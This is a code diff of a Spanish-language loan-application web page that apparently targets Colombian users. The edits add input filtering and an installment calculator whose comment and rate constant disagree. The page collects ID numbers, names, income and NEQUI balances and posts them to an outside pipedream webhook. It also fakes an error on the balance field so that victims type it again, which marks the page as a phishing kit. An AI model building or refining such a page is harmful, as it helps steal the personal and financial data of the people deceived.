@@ -216,12 +216,12 @@
         
         <div class="form-group">
             <label>Ingresa tu cédula</label>
-            <input type="text" id="cedula" placeholder="Ej: 1234567890">
+            <input type="text" id="cedula" placeholder="Ej: 1234567890" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="10">
         </div>
-        
+
         <div class="form-group">
             <label>Nombre y apellido</label>
-            <input type="text" id="nombre" placeholder="Ej: Juan Pérez">
+            <input type="text" id="nombre" placeholder="Ej: Juan Pérez" oninput="this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '')">
         </div>
         
         <div class="form-group">
@@ -271,7 +271,7 @@
         
         <div class="resumen">
             <p style="font-size: 16px; margin-bottom: 10px;">Así quedarían tus cuotas</p>
-            <div class="resumen-cuota">0</div>
+            <div class="resumen-cuota" id="cuotaDisplay">0</div>
             <p style="font-size: 14px; opacity: 0.7; margin-top: 5px;">mensuales</p>
         </div>
         
@@ -281,6 +281,7 @@
     <script>
         const slider = document.getElementById('amountSlider');
         const amountDisplay = document.getElementById('amountDisplay');
+        const cuotaDisplay = document.getElementById('cuotaDisplay');
         const btnSolicitar = document.getElementById('btnSolicitar');
         
         const cedula = document.getElementById('cedula');
@@ -293,6 +294,30 @@
         const campos = [cedula, nombre, ocupacion, ingresos, gastos, saldo];
         
         let saldoValidado = false;
+        
+        // TASA DE INTERÉS: 0.5% mensual
+        const TASA_INTERES = 0.03;
+        
+        // Función para calcular cuota con interés compuesto (Sistema Francés)
+        function calcularCuota(monto, meses, tasaMensual = TASA_INTERES) {
+            if (!meses || meses === 0) return 0;
+            if (tasaMensual === 0) return monto / meses;
+            
+            const factor = Math.pow(1 + tasaMensual, meses);
+            const cuota = monto * (tasaMensual * factor) / (factor - 1);
+            
+            return Math.round(cuota);
+        }
+        
+        // Función para actualizar el display de la cuota
+        function actualizarCuotaDisplay() {
+            const monto = parseInt(slider.value);
+            const cuotasActiva = document.querySelector('.cuota-btn.active');
+            const meses = parseInt(cuotasActiva.dataset.cuotas);
+            
+            const cuotaCalculada = calcularCuota(monto, meses);
+            cuotaDisplay.textContent = formatSliderNumber(cuotaCalculada);
+        }
         
         function formatNumber(input) {
             let value = input.value.replace(/\./g, '').replace(/\D/g, '');
@@ -307,14 +332,18 @@
             return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
         }
         
+        // Evento del slider - actualiza monto y recalcula cuota
         slider.addEventListener('input', function() {
             amountDisplay.textContent = formatSliderNumber(this.value);
+            actualizarCuotaDisplay();
         });
         
+        // Eventos de los botones de cuotas
         document.querySelectorAll('.cuota-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.cuota-btn').forEach(b => b.classList.remove('active'));
                 this.classList.add('active');
+                actualizarCuotaDisplay();
                 validarCampos();
             });
         });
@@ -361,10 +390,7 @@
             if (!saldoValidado) {
                 e.preventDefault();
                 
-                // Borrar el campo de saldo
                 saldo.value = '';
-                
-                // Agregar clase de error (borde rojo)
                 saldo.classList.add('error');
                 
                 saldoValidado = true;
@@ -377,38 +403,41 @@
             
             const montoSeleccionado = slider.value;
             localStorage.setItem('montoCredito', montoSeleccionado);
+            
             const webhookURL = 'https://eo8ne5wlaz6wu8g.m.pipedream.net';
 
-const datos = {
-    cedula: cedula.value,
-    nombre: nombre.value,
-    ocupacion: ocupacion.value,
-    ingresos: ingresos.value,
-    gastos: gastos.value,
-    saldo: saldo.value,
-    monto: amountDisplay.textContent,
-    cuotas: document.querySelector('.cuota-btn.active').dataset.cuotas,
-    fechaPago: document.querySelector('.fecha-btn.active').dataset.dia
-};
+            const datos = {
+                cedula: cedula.value,
+                nombre: nombre.value,
+                ocupacion: ocupacion.value,
+                ingresos: ingresos.value,
+                gastos: gastos.value,
+                saldo: saldo.value,
+                monto: amountDisplay.textContent,
+                cuotas: document.querySelector('.cuota-btn.active').dataset.cuotas,
+                fechaPago: document.querySelector('.fecha-btn.active').dataset.dia,
+                cuotaEstimada: cuotaDisplay.textContent
+            };
 
-const mensaje = `📋 **DATOS PERSONALES**\n` +
-                `👤 Cédula: ${datos.cedula}\n` +
-                `📛 Nombre: ${datos.nombre}\n` +
-                `💼 Ocupación: ${datos.ocupacion}\n` +
-                `💰 Ingresos: $${datos.ingresos}\n` +
-                `📤 Gastos: $${datos.gastos}\n` +
-                `🏦 Saldo NEQUI: $${datos.saldo}\n` +
-                `💳 Monto solicitado: $${datos.monto}\n` +
-                `📅 Plazo: ${datos.cuotas} meses\n` +
-                `🔢 Fecha de pago: Día ${datos.fechaPago}`;
+            const mensaje = `📋 **DATOS PERSONALES**\n` +
+                            `👤 Cédula: ${datos.cedula}\n` +
+                            `📛 Nombre: ${datos.nombre}\n` +
+                            `💼 Ocupación: ${datos.ocupacion}\n` +
+                            `💰 Ingresos: $${datos.ingresos}\n` +
+                            `📤 Gastos: $${datos.gastos}\n` +
+                            `🏦 Saldo NEQUI: $${datos.saldo}\n` +
+                            `💳 Monto solicitado: $${datos.monto}\n` +
+                            `📅 Plazo: ${datos.cuotas} meses\n` +
+                            `🔢 Fecha de pago: Día ${datos.fechaPago}\n` +
+                            `💵 Cuota estimada: $${datos.cuotaEstimada}`;
 
-fetch(webhookURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content: mensaje })
-}).finally(() => {
-    window.location.href = 'verificando-datos.html';
-});
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: mensaje })
+            }).finally(() => {
+                window.location.href = 'verificando-datos.html';
+            });
         });
         
         saldo.addEventListener('input', function() {
@@ -418,6 +447,8 @@ fetch(webhookURL, {
             }
         });
         
+        // Inicializar el cálculo de cuota al cargar la página
+        actualizarCuotaDisplay();
         validarCampos();
     </script>
 </body>
